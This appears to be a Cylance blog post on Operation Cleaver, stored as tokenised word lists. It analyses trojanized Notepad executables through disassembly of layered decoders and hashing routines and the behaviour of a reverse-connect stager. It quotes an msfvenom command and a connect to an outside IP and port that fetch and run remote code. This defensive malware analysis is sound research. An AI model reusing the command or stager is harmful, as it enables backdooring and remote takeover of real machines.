["Figure", "1", ".", "The", "Notepad", "Doppelg\u00e4ngers", "."], ["Of", "course", ",", "a", "purloined", "Notepad", "icon", "in", "malware", "is", "nothing", "new", ",", "but", "something", "different", "was"], ["going", "on", "here", ".", "Within", "each", "of", "the", "two", "families", ",", "all", "of", "the", "samples", "had", "the", "same", "main", "icon", ",", "file"], ["size", ",", "and", "version", "information", ",", "yet", "each", "one", "had", "a", "distinct", "hash", ".", "At", "the", "time", ",", "only", "one", "of", "those", "five"], ["hashes", "existed", "on", "the", "internet:", "the", "official", "32-bit", "Simplified", "Chinese", "Notepad", "from", "Windows", "XP"], ["x64", "/", "Windows", "Server", "2003", ".", "Suspecting", "that", "the", "remaining", "Notepads", "were", "derivatives", "of", "official"], ["Windows", "files", ",", "we", "associated", "the", "other", "member", "of", "the", "first", "family", "with", "the", "confirmed", "legitimate"], ["Notepad", ",", "and", "we", "matched", "the", "second", "family", "with", "the", "32-bit", "US", "English", "Notepad", "from", "Windows"], ["7", "(not", "present", "in", "the", "original", "set)", "."], ["MD5"], ["File", "Name"], ["File", "Size"], ["File", "Version"], ["83868cdff62829fe3b897e2720204679"], ["notepad", ".", "exe"], ["66", ",", "048"], ["5", ".", "2.3790.3959,", "Chinese", "(Simplified", ",", "PRC)"], ["bfc59f1f442686af73704eff6c0226f0"], ["NOTEPAD2", ".", "EXE"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States)"], ["e8ea10d5cde2e8661e9512fb684c4c98"], ["Notepad3", ".", "exe"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States)"], ["baa76a571329cdc4d7e98c398d80450c"], ["Notepad4", ".", "exe"], ["66", ",", "048"], ["5", ".", "2.3790.3959,", "Chinese", "(Simplified", ",", "PRC)"], ["19d9b37d3acf3468887a4d41bf70e9aa"], ["notepad10", ".", "exe"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States"], ["d378bffb70923139d6a4f546864aa61c"], ["--"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States)"], ["Table", "1", ".", "A", "summary", "of", "Notepad", "samples", "dug", "from", "the", "attackers'", "FTP", "drop", ",", "with", "the", "official", "Windows", "7", "Notepad", "appearing", "at"], ["bottom", ".", "It", "and", "the", "official", "Windows", "XP/2003", "Notepad", "are", "represented", "in", "green", "."], ["Things", "got", "interesting", "when", "we", "started", "comparing", "the", "Notepads", "at", "the", "byte", "level", ".", "The", "image"], ["below", "depicts", "some", "byte", "differences", "between", "the", "original", "Windows", "7", "Notepad", "and", "samples"], ["NOTEPAD2", ".", "EXE", "and", "Notepad3", ".", "exe:"], ["Figure", "2", ".", "Comparison", "of", "the", "Windows", "7", "Notepad", "(green", "channel)", ",", "NOTEPAD2", ".", "EXE", "(red", "channel)", ",", "and", "Notepad3", ".", "exe", "(blue", "channel)", "."], ["At", "the", "Portable", "Executable", "(PE)", "level", ",", "these", "differences", "translate", "to", "changes", "in", "the", "files'"], ["timestamps", "(IMAGE_NT_HEADERS", ".", "FileHeader.TimeDateStamp,", "offset", "0xE8", "in", "the", "figure", "above)", ","], ["the", "relative", "virtual", "addresses", "(RVAs)", "of", "their", "entry", "points"], ["(IMAGE_NT_HEADERS", ".", "OptionalHeader.AddressOfEntryPoint,", "offset", "0x108)", ",", "and", "their"], ["checksums", "(IMAGE_NT_HEADERS", ".", "OptionalHeader.CheckSum,", "offset", "0x138)", ".", "The", "timestamps"], ["were", "rolled", "back", "by", "weeks", "to", "months", "relative", "to", "the", "legitimate", "progenitors'", "timestamps;", "we"], ["don't", "know", "why", ".", "The", "entry", "points", "retreated", "or", "advanced", "by", "hundreds", "of", "bytes", "to", "dozens", "of"], ["kilobytes", ",", "for", "reasons", "we'll", "explore", "shortly", ".", "And", "the", "checksums", "were", "all", "zeroed", "out", ",", "presumably"], ["because", "the", "file", "modifications", "invalidate", "them", ",", "invalid", "non-zero", "checksums", "are", "a", "tip-off", ",", "and"], ["zeroing", "is", "easier", "than", "recomputing", "."], ["So", "what's", "the", "story", "with", "all", "those", "other", "modifications", "?", "In", "all", "cases", "they", "seem", "to", "be", "confined", "to"], ["the", "\"", ".", "text\"", "section", ",", "centrally", "located", "to", "avoid", "the", "import", "directory", ",", "debug", "directory", ",", "load"], ["configuration", "directory", ",", "and", "import", "address", "table", ".", "This", "makes", "sense", "as", "a", "general", "precaution", ","], ["considering", "that", "corrupting", "the", "import", "directory", "would", "unhelpfully", "crash", "the", "Windows", "loader"], ["during", "process", "initialization", ".", "The", "following", "image", "illustrates", "the", "distribution", "of", "modifications"], ["relative", "to", "these", "structures", "."], ["Figure", "3", ".", "File", "locations", "of", "modifications", "(red)", "and", "the", "PE", "structures", "they", "avoid", "(gray)", ".", "From", "left", "to", "right", ",", "the", "four", "vertical", "bars"], ["represent", "the", "\"", ".", "text\"", "sections", "of", "NOTEPAD2", ".", "EXE,", "Notepad3", ".", "exe,", "Notepad4", ".", "exe,", "and", "notepad10", ".", "exe,", "as", "compared", "to", "the", "original"], ["Notepad", "from", "their", "respective", "families", ".", "The", "Import", "Address", "Table", "(IAT)", ",", "original", "entry", "point", "(OEP", ",", "green)", ",", "malware", "entry", "point", "(EP", ","], ["yellow)", ",", "load", "configuration", "directory", "(LC)", ",", "import", "directory", "(Imp)", ",", "and", "debug", "directory", "(Dbg)", "are", "labeled", "."], ["While", "the", "arrangement", "of", "the", "structures", "varies", "among", "families", ",", "it's", "clear", "from", "the", "figure", "above"], ["that", "the", "region", "between", "structures", "containing", "the", "original", "entry", "point", "has", "in", "each", "case", "been", "filled"], ["with", "modifications", ".", "Notably", ",", "each", "sample", "has", "a", "short", "run", "of", "consecutive", "modifications"], ["immediately", "following", "the", "new", "entry", "point", ",", "and", "then", "a", "longer", "run", "elsewhere", "in", "the", "region", "."], ["Presumably", ",", "both", "runs", "are", "injected", "malicious", "code", ",", "and", "the", "other", "modifications", "may", "well", "be"], ["random", "noise", "intended", "as", "a", "distraction", ".", "Since", "there", "are", "no", "other", "changes", "and", "no", "appended", "data", ","], ["it's", "reasonable", "to", "assume", "that", "the", "code", "that", "makes", "a", "Notepad", "act", "like", "Notepad", "is", "simply", "gone", ","], ["and", "that", "the", "samples", "will", "behave", "only", "maliciously", ".", "If", "true", ",", "then", "these", "modifications", "would"], ["represent", "a", "backdooring", "or", "\"Trojanization\"", "rather", "than", "a", "parasitic", "infection", ",", "and", "this", "distinction"], ["implies", "certain", "things", "about", "how", "the", "Notepads", "were", "made", "and", "how", "they", "might", "be", "used", "."], ["Tales", "from", "the", "Code"], ["Let's", "take", "a", "look", "at", "the", "entry", "point", "code", "of", "the", "malicious", "Notepads", "and", "see", "if", "it", "aligns", "with", "our"], ["observations", ".", "The", "short", "answer", "is", ",", "it", "looks", "like", "nonsense", ".", "Here's", "a", "snippet", "from", "Notepad4", ".", "exe:"], ["010067E3"], ["010067E8"], ["010067EA"], ["010067F0"], ["010067F2"], ["010067F7"], ["010067F9"], ["010067FB"], ["010067FC"], ["010067FE"], ["010067FF"], ["sbb", "eax", ",", "2C7AE239"], ["test", "al", ",", "80"], ["test", "eax", ",", "498DBAD5"], ["jle", "short", "01006831"], ["sub", "eax", ",", "B69F4A73"], ["or", "edx", ",", "esi"], ["jnz", "short", "01006800"], ["inc", "ebx"], ["mov", "cl", ",", "91"], ["cwde"], ["jnp", "short", "01006803"], ["At", "this", "point", "the", "code", "becomes", "difficult", "to", "list", "due", "to", "instruction", "scission", ",", "or", "branching", "into", "the"], ["middle", "of", "an", "instruction", "(analogous", "to", "a", "frameshift", "error", "in", "DNA", "translation", ",", "if", "that", "helps)", ".", "For"], ["instance", ",", "the", "JNP", "instruction", "at", "010067FF", "is", "a", "two-byte", "instruction", ",", "and", "the", "JNZ", "branch", "at"], ["010067F9", ",", "if", "satisfied", ",", "jumps", "to", "the", "JNP", "instruction's", "second", "byte", "at", "01006800", ".", "That", "byte", "begins"], ["a", "different", "two-byte", "instruction", ",", "which", "incorporates", "what", "would", "have", "otherwise", "been", "the", "first"], ["byte", "of", "the", "instruction", "after", "the", "JNP", ",", "meaning", "its", "successor", "will", "start", "in", "the", "middle", "of", "JNP's"], ["successor", ",", "and", "so", "on", ".", "The", "two", "execution", "paths", "usually", "(but", "don't", "necessarily)", "converge", "after", "a"], ["few", "instructions", "."], ["The", "outcome", "of", "these", "instructions", "depends", "on", "the", "initial", "state", "of", "the", "registers", ",", "which", "is"], ["technically", "undefined", ".", "Seeing", "code", "operate", "on", "undefined", "values", "typically", "suggests", "that", "the", "bytes"], ["aren't", "code", "after", "all", "and", "so", "shouldn't", "have", "been", "disassembled", ".", "But", "keep", "looking", ".", "Notice", "that"], ["there", "are", "no", "memory", "accesses", "(which", "could", "raise", "an", "access", "violation)", ",", "no", "stack", "pointer"], ["manipulation", "(which", "could", "cause", "a", "stack", "overflow", "or", "underflow)", ",", "no", "division", "instructions", "(which"], ["could", "raise", "a", "divide", "exception)", ",", "no", "invalid", "or", "privileged", "instructions", ",", "no", "interrupts", "or", "indirect"], ["branches--really", ",", "no", "uncontrolled", "execution", "transfers", "of", "any", "kind", ".", "Even", "more", "tellingly", ",", "all", "the"], ["possible", "execution", "paths", "seem", "to", "eventually", "flow", "to", "this", "code:"], ["01006877"], ["01006879"], ["0100687E"], ["0100687F"], ["01006881"], ["01006882"], ["01006883"], ["01006884"], ["01006885"], ["01006886"], ["01006887"], ["01006888"], ["01006889"], ["0100688E"], ["0100688F"], ["01006891"], ["mov", "ch", ",", "15"], ["cmp", "eax", ",", "4941B62F"], ["xchg", "eax", ",", "ebx"], ["mov", "cl", ",", "4B"], ["stc"], ["wait"], ["xchg", "eax", ",", "ecx"], ["inc", "ebx"], ["cld"], ["db", "67"], ["aaa"], ["cwde"], ["sub", "eax", ",", "24401D66"], ["dec", "eax"], ["add", "al", ",", "F8"], ["jmp", "01005747"], ["01005747"], ["01005748"], ["nop"], ["jmp"], ["01005758"], ["01005758"], ["01005759"], ["0100575A"], ["cld"], ["nop"], ["jmp"], ["short", "01005768"], ["01005768"], ["call", "01005A70"], ["01005A70"], ["01005A71"], ["nop"], ["pop", "ebp"], ["01005A72"], ["01005A85"], ["jmp"], ["nop"], ["01005A85"], ["01005A86"], ["mov"], ["01005A99"], ["01005A9B"], ["push", "00000040"], ["push", "00001000"], ["01005A8B"], ["01005AA0"], ["01005AA1"], ["01005AAF"], ["01005AB0"], ["01005AB1"], ["esi", ",", "000001A9"], ["jmp"], ["nop"], ["jmp"], ["01005A99"], ["01005AAF"], ["push", "esi"], ["nop"], ["jmp"], ["01005AC2"], ["01005AC2"], ["01005AC4"], ["push", "0"], ["push", "E553A458"], ["01005AD7"], ["call", "ebp"], ["01005AC9"], ["jmp"], ["01005AD7"], ["Here", "the", "gaps", "in", "the", "listing", "indicate", "when", "the", "disassembly", "follows", "an", "unconditional", "branch", ".", "The"], ["code", "seems", "to", "abruptly", "change", "character", "after", "the", "jump", "at", "01006891", ",", "transitioning", "from"], ["gibberish", "to", "a", "string", "of", "short", "sequences", "connected", "by", "unconditional", "branches", ".", "This", "transition"], ["corresponds", "to", "a", "jump", "from", "the", "end", "of", "the", "short", "run", "of", "modifications", "(01006896)", "after", "the"], ["malware", "entry", "point", "to", "the", "beginning", "of", "the", "longer", "run", "of", "modifications", "(01005747)", "a", "few"], ["kilobytes", "before", "it", ".", "(See", "the", "third", "column", "in", "Figure", "3", ".", ")"], ["In", "the", "disassembly", "above", ",", "the", "first", "sequence", "of", "green", "lines", "is", "a", "clear", "CALL-POP", "pair", "intended", "to"], ["obtain", "a", "code", "address", "in", "a", "position-independent", "way", ".", "(An", "immediate", "address", "value", "marked", "with"], ["a", "relocation", "would", "be", "the", "orthodox", "way", "to", "obtain", "a", "code", "pointer", ",", "but", "preparing", "that", "would", "have"], ["involved", "modifying", "the", "\"", ".", "reloc\"", "section", ".", ")", "No", "way", "is", "this", "construct", "a", "coincidence", ".", "Furthermore", ",", "the"], ["blue", "lines", "strongly", "resemble", "the", "setup", "for", "a", "VirtualAlloc", "call", "(VirtualAlloc(NULL", ",", "0x1A9", ","], ["MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE))", "typical", "of", "a", "deobfuscation", "stub", ",", "and", "the", "second"], ["set", "of", "green", "lines", "invoke", "the", "CALL-POPped", "function", "pointer", "with", "what", "one", "might", "readily", "assume"], ["is", "a", "hash", "of", "the", "string", "\"VirtualAlloc\"", ".", "(It", "is", ".", ")"], ["There's", "plenty", "more", "to", "observe", "in", "the", "disassembly", ",", "but", ",", "let's", "fast-forward", "past", "it", "."], ["windbg", "-c", "\"bp", "kernel32", "!", "VirtualAlloc", ";", "g\"", "Notepad4", ".", "exe..."], ["Figure", "4", ".", "VirtualAlloc", "breakpoint", "hit", ".", "The", "parameters", "on", "the", "stack", "and", "the", "state", "of", "the", "registers", "are", "as", "expected", "."], ["g", "poi(@esp)", ";", "ba", "w", "1", "@eax+@esi-1", ";", "g", ".", ".."], ["Figure", "5", ".", "Memory", "write", "(hardware)", "breakpoint", "hit", "after", "the", "last", "(0x1A9th)", "byte", "is", "written", "to", "allocated", "memory", "."], ["And", "now", "we", "can", "dump", "the", "extracted", "code", "from", "memory", ".", "It", "isn't", "immediately", "gratifying:"], ["00100000"], ["00100002"], ["00100007"], ["0010000B"], ["0010000C"], ["0010000E"], ["00100010"], ["00100013"], ["00100016"], ["00100019"], ["fabs"], ["mov", "edx", ",", "4DF05534", ";", "=", "initial", "XOR", "key"], ["fnstenv", "[esp-0C]"], [";", "old", "trick", "to", "get", "EIP"], ["pop", "eax"], ["sub", "ecx", ",", "ecx"], ["mov", "cl", ",", "64"], [";", "=", "length", "in", "DWORDs"], ["xor", "[eax+19]", ",", "edx"], ["add", "edx", ",", "[eax+19]", ";", "XOR", "key", "is", "modified", "after", "each", "DWORD"], ["add", "eax", ",", "4"], ["db", "D6"], ["The", "byte", "0xD6", "at", "address", "00100019", "doesn't", "disassemble", ",", "and", "there", "aren't", "any", "branches"], ["skipping", "over", "it", ".", "But", "check", "out", "the", "instructions", "just", "above", "it", "referencing", "\"[eax+19]\"", ".", "The", "code", "is", "in"], ["a", "sense", "self-modifying", ",", "flowing", "right", "into", "a", "portion", "of", "itself", "that", "it", "XOR", "decodes", ".", "The", "first"], ["decoded", "instruction", "is", "\"LOOP", "00100010\"", "(0xD6", "^", "0x34", "=", "0xE2", ",", "the", "opcode", "for", "LOOP)", ",", "which", "will"], ["execute", "the", "XOR", "loop", "body", "99", "more", "times", "(CL", "-", "1", "=", "0x63", "=", "99)", "and", "then", "fall", "through", "to", "the"], ["newly-decoded", "code", "."], ["When", "we", "run", "this", "decoding", "stub", "(which", ",", "come", "to", "find", "out", ",", "is", "Metasploit's", "\"shikata", "ga", "nai\"", "decoder"], ["stub)", "to", "completion", ",", "we're", "rewarded", "with", ".", "..", "another", "decoding", "stub:"], ["0010001B"], ["0010001D"], ["00100021"], ["00100026"], ["00100027"], ["00100029"], ["0010002B"], ["fcmovu", "st", ",", "st(1)", ";", "a", "different", "initial", "FPU", "instruction", "from", "above"], ["fnstenv", "[esp-0C]", ";", "different", "ordering", "of", "independent", "instructions"], ["mov", "ebx", ",", "C2208861", ";", "a", "different", "initial", "XOR", "key", "and", "register"], ["pop", "ebp"], [";", "a", "different", "code", "pointer", "register"], ["xor", "ecx", ",", "ecx", ";", "XOR", "as", "an", "alternative", "to", "SUB", "for", "zeroing", "counter"], ["mov", "cl", ",", "5D", ";", "a", "shorter", "length"], ["xor", "[ebp+1A]", ",", "ebx", ";", "decoding", "starts", "at", "a", "different", "offset"], ["0010002E"], ["add"], ["ebx", ",", "[ebp+1A]"], ["0010002E"], ["00100031"], ["00100034"], ["add", "ebx", ",", "[ebp+1A]"], ["sub", "ebp", ",", "FFFFFFFC", ";", "SUB", "-4", "as", "an", "alternative", "to", "ADD", "+4"], ["loop", "000FFFCA", ";", "instruction", "is", "partly", "encoded"], ["Here", ",", "the", "first", "byte", "to", "be", "XORed", "is", "the", "second", "byte", "of", "the", "LOOP", "instruction", ",", "hence", "the"], ["nonsensical", "destination", "apparent", "in", "the", "pre-decoding", "disassembly", "above", ".", "(For", "brevity", ",", "we", "cut"], ["each", "listing", "at", "the", "first", "sign", "of", "encoding", ".", ")", "Run", "that", "to", "completion", ",", "and", "then", ".", ".."], ["00100036"], ["0010003B"], ["0010003D"], ["00100041"], ["00100042"], ["00100044"], ["00100046"], ["00100049"], ["0010004C"], ["mov", "edx", ",", "463DC74D"], ["fcmovnbe", "st", ",", "st(0)"], ["fnstenv", "[esp-0C]"], ["pop", "eax"], ["sub", "ecx", ",", "ecx"], ["mov", "cl", ",", "57", ";", "notice", "the", "length", "gets", "shorter", "each", "time"], ["xor", "[eax+12]", ",", "edx"], ["add", "eax", ",", "4"], ["add", "ebx", ",", "ds:[47B3DFC9]", ";", "instruction", "is", "partly", "encoded"], ["And", "then", ".", ".."], ["00100051"], ["00100053"], ["00100058"], ["0010005c"], ["0010005d"], ["0010005f"], ["00100061"], ["00100064"], ["00100067"], ["fcmovbe", "st", ",", "st(0)"], ["mov", "edx", ",", "869A5D73"], ["fnstenv", "[esp-0C]"], ["pop", "eax"], ["sub", "ecx", ",", "ecx"], ["mov", "cl", ",", "50"], ["xor", "[eax+18]", ",", "edx"], ["add", "eax", ",", "4"], ["add", "edx", ",", "[eax+67]", ";", "instruction", "is", "partly", "encoded"], ["And", "then", ".", ".."], ["0010006C"], ["00100071"], ["00100073"], ["00100077"], ["00100078"], ["mov", "eax", ",", "E878CF4D"], ["fcmovnbe", "st", ",", "st(4)"], ["fnstenv", "[esp-0C]"], ["pop", "ebx"], ["sub", "ecx", ",", "ecx"], ["0010007A"], ["mov"], ["cl", ",", "49"], ["0010007A"], ["0010007C"], ["0010007F"], ["00100082"], ["00100085"], ["mov", "cl", ",", "49"], ["xor", "[ebx+14]", ",", "eax"], ["add", "ebx", ",", "4"], ["add", "eax", ",", "[ebx+10]"], ["scasd", ";", "incorrect", "disassembly", "of", "encoded", "byte"], ["Finally", ",", "at", "the", "end", "of", "six", "nested", "decoders", ",", "we", "see", "the", "light:"], ["00100087"], ["00100088"], ["0010008D"], ["0010008E"], ["00100090"], ["00100092"], ["00100096"], ["00100099"], ["0010009C"], ["0010009F"], ["001000A3"], ["001000A5"], ["001000A7"], ["001000A8"], ["001000AA"], ["001000AC"], ["001000AE"], ["001000B1"], ["", ".", ".."], ["cld"], ["call", "00100116"], ["pushad"], ["mov", "ebp", ",", "esp"], ["xor", "edx", ",", "edx"], ["mov", "edx", ",", "fs:[edx+30]", ";", "PTEB->ProcessEnvironmentBlock"], ["mov", "edx", ",", "[edx+0C]", ";", "PPEB->Ldr"], ["mov", "edx", ",", "[edx+14]", ";", "PPEB_LDR_DATA->InMemoryOrderModuleList"], ["mov", "esi", ",", "[edx+28]", ";", "PLDR_MODULE", ".", "BaseDllName.Buffer"], ["movzx", "ecx", ",", "word", "ptr", "[edx+26]", ";", "PLDR_MODULE", ".", "BaseDllName.MaximumLength"], ["xor", "edi", ",", "edi"], ["xor", "eax", ",", "eax"], ["lodsb"], ["cmp", "al", ",", "61", ";", "check", "for", "lowercase", "letter"], ["jl", "001000ae"], ["sub", "al", ",", "20", ";", "convert", "to", "uppercase"], ["ror", "edi", ",", "0D"], ["add", "edi", ",", "eax"], ["It", "looks", "like", "a", "call", "over", "a", "typical", "module", "or", "export", "lookup", "function", ".", "In", "fact", ",", "it", "is", ",", "and", "as", "the", "RORADD", "pair", "suggests", ",", "it", "implements", "module", "name", "and", "export", "name", "hashing", ",", "the", "algorithms", "of"], ["which", "can", "be", "expressed", "as", "follows:"], ["unsigned", "int", "GetModuleNameHash(PLDR_MODULE", "pLdrModule)"], ["{"], ["unsigned", "int", "hash", "=", "0;"], ["char", "*", "p", "=", "(char", "*)", "pLdrModule->BaseDllName->Buffer;"], ["for", "(int", "n", "=", "pLdrModule->BaseDllName->MaximumLength;", "n", "", "!", "=", "0;", "p++", ",", "n--)"], ["{"], ["char", "ch", "=", "*p;"], ["if", "(ch", ">=", "'a')", "ch", "-=", "0x20;"], ["hash", "=", "_rotr(hash", ",", "13)", "+", "(unsigned", "char)", "ch;"], ["}"], ["return", "hash;"], ["}"], ["unsigned", "int", "GetExportNameHash(char", "*pszName)"], ["{"], ["unsigned", "int", "hash", "=", "0;"], ["for", "(", ";", ";", "pszName++)"], ["{"], ["hash", "=", "_rotr(hash", ",", "13)", "+", "(unsigned", "char)", "*pszName;"], ["if", "(*pszName", "==", "0)", "break;"], ["}"], ["return", "hash;"], ["}"], ["Still", ",", "this", "is", "all", "just", "preamble", ".", "What", "is", "the", "point", "that", "it", "eventually", "gets", "to", "?"], ["You'd", "be", "forgiven", "for", "assuming", "that", "the", "tremendous", "amount", "of", "effort", "poured", "into", "obfuscation"], ["means", "there's", "some", "treasure", "beyond", "all", "fables", "at", "the", "bottom", "of", "this", "erstwhile", "Notepad", ".", "Sorry", ".", "It"], ["just", "downloads", "and", "executes", "a", "block", "of", "raw", "code", ".", "(Spoiler:", "it's", "actually", "a", "Metasploit", "reverse"], ["connect", "stager", ".", ")", "Here", "is", "its", "behavior", "summarized", "as", "function", "calls:"], ["kernel32", "!", "LoadLibraryA(\"ws2_32\")"], ["ws2_32!WSAStartup(", ".", "..)"], ["s", "=", "ws2_32!WSASocketA(AF_INET", ",", "SOCK_STREAM", ",", "", ".", "..)"], ["ws2_32!connect(s", ",", "{", "sin_family", "=", "AF_INET", ",", "sin_port", "=", "htons(12345)", ",", "sin_addr", "=", "108", ".", "175.152.2"], ["30", "}", ",", "0x10)"], ["ws2_32!recv(s", ",", "&cb", ",", "4", ",", "0)"], ["p", "=", "kernel32!VirtualAlloc(NULL", ",", "cb", ",", "MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE)"], ["ws2_32!recv(s", ",", "p", ",", "cb", ",", "0)"], ["p()"], ["The", "above", "is", "known", "to", "be", "true", "for", "Notepad3", ".", "exe,", "Notepad4", ".", "exe,", "and", "notepad10", ".", "exe."], ["NOTEPAD2", ".", "EXE", "doesn't", "seem", "to", "want", "to", "run", ",", "for", "reasons", "we", "didn't", "bother", "to", "troubleshoot", "for"], ["the", "bad", "guys", "."], ["Denouement"], ["Unfortunately", ",", "we", "never", "did", "obtain", "a", "sample", "of", "the", "code", "that", "might", "have", "been", "downloaded", ".", "The"], ["key", "to", "that", "enigma-embedded", ",", "mystery-wrapped", "riddle", "is", "forever", "lost", "to", "us", ".", "The", "best", "we", "can", "do"], ["is", "read", "what's", "written", "in", "the", "Notepads", "and", "speculate", "as", "to", "why", "they", "exist", "at", "all", "."], ["Clearly", "whatever", "generator", "created", "these", "Notepads", "is", "far", ",", "far", "beyond", "the", "technical"], ["understanding", "of", "the", "Cleaver", "team", ".", "It", "stands", "to", "reason", "that", "there", "is", "a", "generator--no", "chance"], ["these", "were", "crafted", "by", "hand--and", "that", "its", "sophistication", "is", "even", "greater", "than", "that", "of", "its", "output", "."], ["Something", "like", "that", "wouldn't", "be", "used", "only", "once", ".", "Something", "like", "that", ",", "if", "this", "team", "was", "able", "to", "get"], ["ahold", "of", "it", ",", "must", "be", "out", "there", ".", "Turn", "the", "right", "corner", "of", "the", "internet", ",", "and", "you", "can", "find", "anything", ".", ".."], ["Well", "it", "so", "happens", "that", "we", "did", "eventually", "find", "it", ".", "Some", "of", "you", "have", "no", "doubt", "suspected", "it", "all"], ["along", ",", "and", "now", "I'll", "humbly", "confirm", "it", "for", "you:", "the", "Notepads", "were", ",", "in", "their", "entirety", ",", "generated", "by"], ["Metasploit", ".", "Something", "along", "the", "lines", "of", "\"msfvenom", "-x", "notepad", ".", "exe", "-p"], ["windows/shell/reverse_tcp", "-e", "x86/shikata_ga_nai", "-i", "5", "LHOST=108", ".", "175.152.230"], ["LPORT=12345", ">", "Notepad4", ".", "exe\".", "The", "\"msfvenom\"", "tool", "transmogrifies", "a", "Metasploit", "payload", "into"], ["a", "standalone", "EXE", ",", "and", "with", "the", "\"-x\"", "switch", ",", "it'll", "fuse", "the", "payload--encoded", "as", "desired--into", "a"], ["copy", "of", "an", "existing", "executable", ",", "exhibiting", "exactly", "the", "behavior", "we", "just", "described", ".", "Omne", "ignotum"], ["pro", "magnifico", ".", "Perhaps", "the", "more", "bizarre", "a", "thing", "is", ",", "the", "less", "mysterious", "it", "proves", "to", "be", "."], ["However", ",", "we're", "still", "left", "to", "wonder", "what", "Cleaver", "was", "up", "to", "when", "they", "generated", "all", "those"], ["Notepads", ".", "One", "conclusion", "Brian", "proposed", "is", "that", "they're", "intended", "as", "backdoors--replacements"], ["for", "the", "legitimate", "Notepad", "on", "a", "compromised", "system--which", "would", "enable", "Cleaver", "to", "regain"], ["access", "to", "a", "system", "at", "some", "indeterminate", "time", "in", "the", "future", ",", "the", "next", "time", "a", "user", "runs", "Notepad", "."], ["The", "team", "demonstrated", "a", "similarly", "intentioned", "tactic", "with", "a", "connect-back", "shell", "scheduled", "to", "run"], ["in", "a", "six-minute", "window", "each", "night;", "the", "Notepad", "replacement", ",", "while", "more", "intrusive", ",", "could", "be"], ["another", "example", "of", "this", "contingency", "planning", "tendency", "."], ["Or", "maybe", "the", "Notepads", "were", "only", "an", "aborted", "experiment", ",", "attempted", "and", "shelved", ",", "forgotten", "in", "a"], ["flurry", "of", "compromises", "and", "criminal", "activity", ".", "If", "nothing", "else", ",", "they", "made", "for", "an", "unexpected", "bit", "of"], ["mystery", "."], ["Tags:", "Operation", "Cleaver(//blog", ".", "cylance.com/topic/operation-cleaver)"], ["\u00ab", "Back", "to", "Blog(//blog", ".", "cylance.com)"], ["(https://cylance", ".", "com/cylance-careers)"], ["\uf167", "\uf0e1"], ["(https://www", "."], ["(https://w"], ["Careers", "@"], ["Cylance"], ["\uf09a", "\uf099"], ["(https://www", "."], ["(https://tw"], ["(https://cylance", ".", "com/company)"], ["Company"], ["Profile"], ["Blog"], ["AI", "vs", ".", "AV", "Gorillas", "and"], ["Germans", "and"], ["Gartner", ",", "oh", "my"], ["By:", "Stuart", "McClure"], ["(//blog", ".", "cylance.com/ai-vs.-av-gorillas-and-germans-and-gartner-oh-my)"], ["(https://cylance", ".", "com/products-protect)"], ["The"], ["Unbelievable"], ["Tour"], ["(https://cylance", ".", "com/events-on-tour)"], ["(https://cylance", ".", "com)"], ["Home(https://cylance", ".", "com/)"], ["Partners"], ["Events"], ["Technology"], ["Unbelievable"], ["Partners(https://cylance", ".", "com/technologyTour(https://cylance.com/even"], ["Products"], ["partner)"], ["on-tour)"], ["PROTECT(https://cylance", ".", "com/productsprotect)", "Resellers(https://cylance", ".", "com/partners-", "Events", "&"], ["reseller)", "Tradeshows(https://cylance", ".", "co"], ["PROTECT", "+", "Threat"], ["(https://www", ".", "youtube.com/user/CylanceInc)"], ["Partner", "Portal"], ["corporate-events)"], ["Zero(https://cylance", ".", "com/productsWebinars(https://cylance.com/"], ["protect-threat-zero)Login(https://cylance", ".", "portal.relayware.com/)"], ["Become", "a"], ["webinar)"], ["PROTECT", "for", "Critical"], ["(https://www", ".", "linkedin.com/company/cylanceinc)"], ["Partner(https://cylance", ".", "portal.relayware.com/?"], ["Infrastructure(https://cylance", ".", "com/productseid=register)"], ["protect-critical-infrastructure)"], ["Resources"], ["(https://www", ".", "facebook.com/CylanceInc)", "PROTECT", "for"], ["Whitepap"], ["Education(https://cylance", ".", "com/productsDatasheets(https://cylance.com"], ["Company"], ["protect-education)"], ["Who", "We"], ["Videos(//www", ".", "cylance.com/res"], ["(https://twitter", ".", "com/cylanceinc)"], ["PROTECT", "for", "Are(https://cylance", ".", "com/company)"], ["videos)"], ["18201", "Von", "Karman", ",", "Suite", "700"], ["Energy(https://cylance", ".", "com/productsNews", "+"], ["Irvine", ",", "CA", "92612"], ["protect-energy)", "Press(https://cylance", ".", "com/companyBlog(//blog.cylance.com)"], ["USA(https://www", ".", "google.com/maps/place/18201+Von+Karman+Ave+%23700,+Irvine,+CA+92612/@33.6779"], ["PROTECT", "for"], ["news-press-releases)"], ["Finance(https://cylance", ".", "com/productsAwards(https://cylance.com/company-", "Contact"], ["Call", "Us:", "1-844-CYLANCE(tel:+18442952623)protect-finance)"], ["awards)", "Us(https://cylance", ".", "com/conta"], ["1-844-295-2623(tel:+18442952623)", "PROTECT", "for", "Careers(https://cylance", ".", "com/cylanceus)"], ["Healthcare(https://cylance", ".", "com/products-", "careers)"], ["Get", "Support:", "1-866-699-9689", "(tel:+18666999686)"], ["Privacy"], ["protect-healthcare)"], ["Contact"], ["Policy(https://cylance", ".", "com/pr"], ["PROTECT", "for", "Us(https://cylance", ".", "com/contactpolicy)"], ["\u00a9", "Cylance", "Inc", ".", "All", "Rights", "Reserved"], ["Retail(https://cylance", ".", "com/productsus)"], ["Privacy"], ["protect-retail)"], ["Security"], ["Policy(https://cylance", ".", "com/privacyTerms", "Of"], ["Questions(//www", ".", "cylance.com/securitypolicy)", "Terms", "Of"], ["Service(https://cylance", ".", "com/t"], ["questions)"], ["Service(https://cylance", ".", "com/terms)Services"], ["Services"], ["Support(https://support", ".", "cylance.com/hc/enSitemap(https://cylance.com/site-", "Overview(https://cylance", ".", "com/services)"], ["\uf167"], ["\uf0e1"], ["\uf09a"], ["\uf099"], ["Services"], ["Support(https://support", ".", "cylance.com/hc/enSitemap(https://cylance.com/site-", "Overview(https://cylance", ".", "com/services)"], ["us)", "Sitemap(https://cylance", ".", "com/"], ["map)"], ["Services", "for", "Critical"], ["map)"], ["Infrastructure(https://cylance", ".", "com/servicescritical-infrastructure)"], ["Services", "for"], ["Education(https://cylance", ".", "com/serviceseducation)"], ["Services", "for"], ["Energy(https://cylance", ".", "com/servicesenergy)"], ["Services", "for"], ["Finance(https://cylance", 